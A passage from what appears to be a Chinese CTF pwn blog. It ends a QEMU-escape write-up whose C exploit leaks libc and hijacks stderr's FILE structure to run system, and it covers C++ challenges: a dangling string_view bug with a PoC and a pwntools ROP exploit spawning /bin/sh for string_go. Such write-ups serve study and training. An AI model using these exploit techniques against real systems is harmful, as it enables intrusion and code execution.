class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br><span class="hljs-comment">// 00:0000│ rbx 0x56043c8e1fa8 ◂— 0xaba29ec2a98dd89a                                                     </span><br><span class="hljs-comment">// 01:0008│     0x56043c8e1fb0 ◂— 0xbbf1b4ab81b4a9d4                                                     </span><br><span class="hljs-comment">// 02:0010│     0x56043c8e1fb8 ◂— 0xfb92a48db386ffa8                                                     </span><br><span class="hljs-comment">// 03:0018│     0x56043c8e1fc0 ◂— 0xefb491b8afb4abd3                                                     </span><br><span class="hljs-comment">// 04:0020│ r11 0x56043c8e1fc8 ◂— 0x80ef69f1cbd00397                                                    </span><br><span class="hljs-comment">// 05:0028│     0x56043c8e1fd0 ◂— 0xb2eb07859cda52d3                                                     </span><br><span class="hljs-comment">// 06:0030│     0x56043c8e1fd8 ◂— 0xec9e22f5a5a07fa3                                                 </span><br><span class="hljs-comment">// 07:0038│     0x56043c8e1fe0 ◂— 0x4b36df7b5b655a84 </span><br><br><span class="hljs-comment">// 00:0000│ rbx 0x559cbeef0fa8 ◂— 0x7a1299023d29ff68                                                     </span><br><span class="hljs-comment">// 01:0008│     0x559cbeef0fb0 ◂— 0x702edf5e423bb634                                                     </span><br><span class="hljs-comment">// 02:0010│     0x559cbeef0fb8 ◂— 0x2653e2366369b36c                                                     </span><br><span class="hljs-comment">// 03:0018│     0x559cbeef0fc0 ◂— 0xd9a33790b594ae73                                                     </span><br><span class="hljs-comment">// 04:0020│ r11 0x559cbeef0fc8 ◂— 0xc9b59388b0adbfbe                                                     </span><br><span class="hljs-comment">// 05:0028│     0x559cbeef0fd0 ◂— 0x8bb287b5efbeaf84                                                     </span><br><span class="hljs-comment">// 06:0030│     0x559cbeef0fd8 ◂— 0x95b4a2838496a4f8                                                    </span><br><span class="hljs-comment">// 07:0038│     0x559cbeef0fe0 ◂— 0xc6ca9ad88681c5b4     </span><br><br><span class="hljs-comment">// 0x7f0f875f94a0 ◂— 0x3525b76e0d25b76e</span><br><span class="hljs-comment">// 0x7f0f875f94a8 ◂— 0xb5a5278efde5674e</span><br><span class="hljs-comment">// 0x7f0f875f94b0 ◂— 0xb58517cead8517ce</span><br><span class="hljs-comment">// 0x7f0f875f94b8 ◂— 0x3505e72e7d4527ee</span><br><br><span class="hljs-comment">// something_i_know ^ x = flag 0x559cbeef0570</span><br><br>    set_value(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x7a1299023d29ff68</span>);<br>    set_value(<span class="hljs-number">0x8</span>,<span class="hljs-number">0x702edf5e423bb634</span>);<br>    set_value(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2653e2366369b36c</span>);<br>    set_value(<span class="hljs-number">0x18</span>,<span class="hljs-number">0xd9a33790b594ae73</span>);<br>    set_value(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xc9b59388b0adbfbe</span>);<br>    set_value(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x8bb287b5efbeaf84</span>);<br>    set_value(<span class="hljs-number">0x30</span>,<span class="hljs-number">0x95b4a2838496a4f8</span>);<br>    set_value(<span class="hljs-number">0x38</span>,<span class="hljs-number">0xc6ca9ad88681c5b4</span>);<br>    <br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    pmio_write(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    pmio_write(<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    leak[<span class="hljs-number">0</span>] = mmio_read(<span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">uint32_t</span> addr1 = <span class="hljs-number">0</span>;<br>    addr1 = (leak[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">24</span>) &lt;&lt; <span class="hljs-number">24</span>;<br><br>    mmio_write(<span class="hljs-number">0x40</span>,addr1 + <span class="hljs-number">0x8a0</span>);<br>    leak[<span class="hljs-number">0</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x10</span>);<br>    leak[<span class="hljs-number">1</span>] = pmio_read(<span class="hljs-number">4</span>+<span class="hljs-number">0x10</span>);<br>    <br>    <span class="hljs-type">uint64_t</span> addr2 = <span class="hljs-number">0</span>;<br>    addr2 = leak[<span class="hljs-number">1</span>] * <span class="hljs-number">0x100000000</span> + leak[<span class="hljs-number">0</span>];<br>    sleep(<span class="hljs-number">1</span>);<br>    mmio_write(<span class="hljs-number">0x40</span>,leak[<span class="hljs-number">0</span>]+<span class="hljs-number">0x8a0</span><span class="hljs-number">-0x30</span>);<br><br>    leak[<span class="hljs-number">0</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x10</span>);<br>    leak[<span class="hljs-number">1</span>] = pmio_read(<span class="hljs-number">0</span>+<span class="hljs-number">0x14</span>);<br>    <br>    <span class="hljs-type">size_t</span> libc_address = <span class="hljs-number">0</span>;<br>    libc_address = (leak[<span class="hljs-number">1</span>]*<span class="hljs-number">0x100000000</span>) + leak[<span class="hljs-number">0</span>] - <span class="hljs-number">0x219c80</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc_address is %lx&quot;</span>,libc_address);<br><br>    <span class="hljs-type">size_t</span> system_addr = <span class="hljs-number">0x50d70</span> + libc_address;<br>    <span class="hljs-type">size_t</span> stderr_addr = <span class="hljs-number">0x21a6a0</span> + libc_address;<br>    <span class="hljs-type">size_t</span> _IO_list_all = <span class="hljs-number">0x21a680</span> + libc_address;<br>    <span class="hljs-type">size_t</span> _IO_wfile_jumps = <span class="hljs-number">0x2160c0</span> + libc_address;<br><br>    <span class="hljs-built_in">memcpy</span>(payload, <span class="hljs-string">&quot;  cat flag &gt;&amp;2;&quot;</span>, <span class="hljs-number">0x10</span>);<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">5</span>] = <span class="hljs-number">1</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">20</span>] = addr2;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">27</span>] = _IO_wfile_jumps;<br>    send_payload(stderr_addr, <span class="hljs-number">0xe0</span>);<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">20</span>] = <span class="hljs-number">0</span>;<br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">27</span>] = <span class="hljs-number">0</span>;<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = stderr_addr;<br>    send_payload(stderr_addr - <span class="hljs-number">0x20</span>, <span class="hljs-number">0x8</span>);<br>    <br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = addr2+<span class="hljs-number">0xe0</span>;<br>    send_payload(addr2+<span class="hljs-number">0xe0</span>, <span class="hljs-number">0x8</span>);<br><br>    ((<span class="hljs-type">uint64_t</span>*)payload)[<span class="hljs-number">0</span>] = system_addr;<br>    send_payload(addr2+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x68</span>,<span class="hljs-number">8</span>);<br><br><br>    system(<span class="hljs-string">&quot;poweroff -f&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/10.png" alt="img"></p><p>终于出来啦，感觉比🐍出来还要舒服啊</p><p>其实感觉挺基础的一道qemu escape，但为什么要加个逆向来恶心我呢。</p><p>这是怎么绘事呢？</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF、Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dig into C++ pwn</title>
    <link href="/2023/10/20/C/"/>
    <url>/2023/10/20/C/</url>
    
    <content type="html"><![CDATA[<h1 id="learn-to-do-C-Pwn"><a href="#learn-to-do-C-Pwn" class="headerlink" title="learn to do C++ Pwn"></a>learn to do C++ Pwn</h1><h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>借用前华东百之👴的一句话：</p><p>c++pwn，就是艹c艹</p><h1 id="0x1-愉悦的折磨"><a href="#0x1-愉悦的折磨" class="headerlink" title="0x1:愉悦的折磨"></a>0x1:愉悦的折磨</h1><h2 id="N1-junior2023-顶级签到"><a href="#N1-junior2023-顶级签到" class="headerlink" title="N1 junior2023 顶级签到"></a>N1 junior2023 顶级签到</h2><p>当初笔者参加N1 junior，这题是看都看不懂，在学了两天C++基本语法后，笔者重新捡起了这题</p><p>题目给了源码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">(写完程序)</span><br><span class="hljs-comment">“你自己运行了吗？😏”</span><br><span class="hljs-comment">“跑了一下🤥”</span><br><span class="hljs-comment">“感觉怎么样？🧐”</span><br><span class="hljs-comment">“我去除了大部分的安全问题，但是我保留了一部分” “我觉得保留了一部分漏洞，才知道你做的是CTF题🤓”</span><br><span class="hljs-comment">“你是有意把它保留的吗🤨”</span><br><span class="hljs-comment">“是编写过程中，我留下了一部分😌”</span><br><span class="hljs-comment">“是故意的还是不小心😨”</span><br><span class="hljs-comment">“是故意的😋”</span><br><span class="hljs-comment">（打开源码）</span><br><span class="hljs-comment">“🍴😵‍💫🥴😤😡🤬”</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;exception&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string_view&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;functional&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-function">string <span class="hljs-title">getInput</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string res;<br>    <span class="hljs-built_in">getline</span>(cin, res);<br>    <span class="hljs-keyword">if</span> (res.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">64</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">runtime_error</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>    <span class="hljs-keyword">while</span> (!res.<span class="hljs-built_in">empty</span>() &amp;&amp; res.<span class="hljs-built_in">back</span>() == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        res.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-type">bool</span> allow_admin = <span class="hljs-literal">false</span>;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">splitToken</span><span class="hljs-params">(string_view str, string_view delim)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!allow_admin &amp;&amp; str.<span class="hljs-built_in">find</span>(<span class="hljs-string">&quot;admin&quot;</span>) != str.npos)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Access denied&quot;</span>);<br>    vector&lt;string_view&gt; res;<br>    <span class="hljs-type">size_t</span> prev = <span class="hljs-number">0</span>, pos = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        pos = str.<span class="hljs-built_in">find</span>(delim, prev);<br>        <span class="hljs-keyword">if</span> (pos == std::string::npos)<br>        &#123;<br>            pos = str.<span class="hljs-built_in">length</span>();<br>        &#125;<br>        res.<span class="hljs-built_in">push_back</span>(str.<span class="hljs-built_in">substr</span>(prev, pos - prev));<br>        prev = pos + delim.<span class="hljs-built_in">length</span>();<br>    &#125; <span class="hljs-keyword">while</span> (pos &lt; str.<span class="hljs-built_in">length</span>() &amp;&amp; prev &lt; str.<span class="hljs-built_in">length</span>());<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">parseUser</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> tok_ring = <span class="hljs-built_in">splitToken</span>(<span class="hljs-built_in">getInput</span>(), <span class="hljs-string">&quot;:&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring.<span class="hljs-built_in">size</span>() != <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login token&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>() &lt; <span class="hljs-number">4</span> || tok_ring[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login name&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring[<span class="hljs-number">1</span>].<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">32</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login password&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(tok_ring[<span class="hljs-number">0</span>], tok_ring[<span class="hljs-number">1</span>]);<br>&#125;<br><span class="hljs-type">const</span> unordered_map&lt;string_view, function&lt;<span class="hljs-type">void</span>(string_view)&gt;&gt; handle_admin = &#123;<br>    &#123;<span class="hljs-string">&quot;admin&quot;</span>, [](<span class="hljs-keyword">auto</span>)<br>     &#123;<br>         <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/readflag&quot;</span>);<br>     &#125;&#125;,<br>    &#123;<span class="hljs-string">&quot;?&quot;</span>, [](<span class="hljs-keyword">auto</span>)<br>     &#123;<br>         cout &lt;&lt; <span class="hljs-string">&quot;Enjoy :)&quot;</span> &lt;&lt; endl;<br>         cout &lt;&lt; <span class="hljs-string">&quot;https://www.bilibili.com/video/BV1Nx411S7VG&quot;</span> &lt;&lt; endl;<br>     &#125;&#125;&#125;;<br><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> handle_guest = [](<span class="hljs-keyword">auto</span>)<br>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Hello guest!&quot;</span> &lt;&lt; endl;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> [username, password] = <span class="hljs-built_in">parseUser</span>();<br>    cout &lt;&lt; <span class="hljs-string">&quot;Enter &#x27;login&#x27; to continue, or enter &#x27;quit&#x27; to cancel.&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">auto</span> choice = <span class="hljs-built_in">getInput</span>();<br>    <span class="hljs-keyword">if</span> (choice == <span class="hljs-string">&quot;quit&quot;</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;bye&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> it = handle_admin.<span class="hljs-built_in">find</span>(username); it != handle_admin.<span class="hljs-built_in">end</span>())<br>    &#123;<br>        it-&gt;<span class="hljs-built_in">second</span>(password);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">handle_guest</span>(password);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>怎么说呢，👴只能看出个大概运行逻辑，但👴是真的找不到洞</p><p>👴只能求助👴高中的OI👴（国一👴！！）</p><p><img src="/img/C++/0.png" alt="img"></p><p>问题出现在 <code>main</code> 函数中。一旦 <code>parseUser</code> 返回，<code>splitToken</code> 函数中创建的字符串就超出了它们的作用域，因为这些字符串是局部变量。因此，<code>username</code> 和 <code>password</code> 变量成为了悬垂指针（Dangling Pointers），它们引用的内存已经无效。</p><p>所以第二次输入到choice变量的时候，就可以复用这个悬垂指针，看似指向username 和 password，实则里面的内容已经是choice，所以输入choice的时候输入”admin”就行了。，</p><p>👴以为👴又行了，结果试了一下发现八行。👴很恼火，就去摸鱼了，摸着摸着就摸到了纯真✌的博客（<a href="https://zqy.ink/2023/05/12/dingjiqiandao/">@张清越</a>），了解了SSO机制对于不同长度的字符串的处理。</p><p>同时string_view会记录字符串的size，因为admin的size是5，所以第一次login的时候username的size也应该是5.</p><p>👴又自己写了一个poc，应该更好理解一点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;iostream&gt;</span><br><span class="hljs-comment">#include &lt;string_view&gt;</span><br><span class="hljs-comment">#include &lt;cstring&gt;</span><br><span class="hljs-comment">#include &lt;vector&gt;</span><br><br>std::string_view CreateAndReturnPointer() &#123;<br><br>   std::string res;<br>   getline(std::cin,res);<br>   std::string_view strView(res);<br><br>   <span class="hljs-keyword">return</span> strView;<br>&#125;<br><br><span class="hljs-built_in">int</span> main() &#123;<br><br>   std::string_view view = CreateAndReturnPointer();<br>   <br>   std::string res;<br>   getline(std::cin,res);<br><br>   std::cout &lt;&lt; <span class="hljs-string">&quot;now the content of string_view is :&quot;</span> &lt;&lt; view.substr(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>) &lt;&lt; std::endl;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.sendline(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>按理来说，view指向的字符串应该是b’a’*0x80</p><p>但是刚出CreateAndReturnPointer函数，储存字符串的chunk就被free了</p><p><img src="/img/C++/1.png" alt="img"></p><p>所以后面的getline获取输入的时候，一但输入size和第一次输入size相等，这个chunk又会被启用，但是，其中的内容已经变了，而view并不知道家被偷了。</p><p>所以最后的结果便是</p><p><img src="/img/C++/2.png" alt="img"></p><p>噫，👴终于懂了。</p><h2 id="西湖论剑2021-string-go"><a href="#西湖论剑2021-string-go" class="headerlink" title="西湖论剑2021 string_go"></a>西湖论剑2021 string_go</h2><p>👴在翻库存的时候发现了一道21年的西葫芦🗡的C++</p><p>就拿过来练练手</p><p>程序本身实现了一个只能进行加减运算的clac，当计算结果为3时可以进入lative_func</p><p><img src="/img/C++/3.png" alt="img"></p><p>后面经过动调发现,字符串-8的地方存放的是输出时的size，同时idx可以为负数，那就能把size给改了，泄露出栈上的数据后用memcpy完成栈溢出。</p><p><img src="/img/C++/4.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./string_go&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./string_go&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x23A9)\nc\n&quot;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>rc(<span class="hljs-number">0x18</span>)<br>data1 = rc(<span class="hljs-number">0x18</span>)<br>canary = u64(rc(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br><br>rc(<span class="hljs-number">8</span>)<br>elf_base = u64(rc(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1760</span><br>leak(<span class="hljs-string">&quot;elf_base&quot;</span>,elf_base)<br><br>pop_rdi = <span class="hljs-number">0x0000000000003cf3</span> + elf_base<br>main = elf_base + <span class="hljs-number">0x24bd</span><br><br>data2 = rc(<span class="hljs-number">0x18</span>)<br>p.recv()<br>payload = <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + \<br>          p64(pop_rdi) + p64(elf_base + elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]+elf_base) + p64(main)<br>sl(payload)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;-7&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + \<br>          p64(elf_base + <span class="hljs-number">0x00000000000014ce</span>)+ p64(pop_rdi)+ p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ByteCTF2020-TikTok"><a href="#ByteCTF2020-TikTok" class="headerlink" title="ByteCTF2020 TikTok"></a>ByteCTF2020 TikTok</h2><p>在A3👴博客中找到的题，C++逆向就是出生的太阳，逼样的晚意。</p><p>题目一打开，楽，真会整活</p><p><img src="/img/C++/5.png" alt="img"></p><p>功能多的一批，于是👴就勤勤肯肯把所有功能都写了，结果👴在delete，输入密码的时候，发现密码输入错误直接把栈里面的数据带出来了，👴就知道这把有了。因为delete这个功能有几个花指令，不能傻瓜create function，看不了伪代码。于是👴进gdb看到了memcpy，甚至输入错位还有输出，人还怪好的。那就是泄露数据后栈溢出，和前一题一样的套路。</p><p>（所以这么多fuction你是一点没用啊）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 